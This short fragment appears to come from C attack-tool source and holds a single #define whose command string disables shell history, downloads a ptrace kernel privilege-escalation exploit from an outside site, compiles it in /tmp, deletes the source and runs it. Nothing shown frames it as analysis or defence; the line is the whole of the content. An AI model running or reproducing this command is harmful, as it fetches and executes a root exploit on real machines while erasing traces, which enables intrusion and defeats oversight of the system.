...
#define COMMAND2 "unset HISTFILE; cd /tmp; wget http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c; rm e; gcc -o /tmp/e ptrace-kmod.c; rm ptrace-kmod.c; ./e"
